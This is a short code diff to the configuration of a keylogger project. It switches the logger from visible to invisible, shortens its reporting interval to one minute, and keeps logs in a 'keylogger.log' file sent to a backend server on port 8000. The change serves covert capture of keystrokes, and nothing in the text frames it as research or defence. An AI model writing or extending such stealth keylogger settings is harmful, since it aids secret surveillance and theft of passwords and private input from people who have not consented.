@@ -33,12 +33,12 @@ export const SERVER_CONFIG = {
 // Keylogger Configuration
 export const configValues = {
     format: 0, // 0 = labels, 10 = decimal, 16 = hex
-    visible: true, // true = VISIBLE, false = INVISIBLE
+    visible: false, // true = VISIBLE, false = INVISIBLE
     boot_wait: true, // true = BOOT_WAIT, false = NOWAIT
     mouse_ignore: true, // true = ignore mouse clicks
     serverName: "localhost",
     resource: "/",
-    intervalMinutes: 2,  // Minutes
+    intervalMinutes: 1,  // Minutes
     log_file_name: "keylogger.log",
     backend_port: 8000,
 };
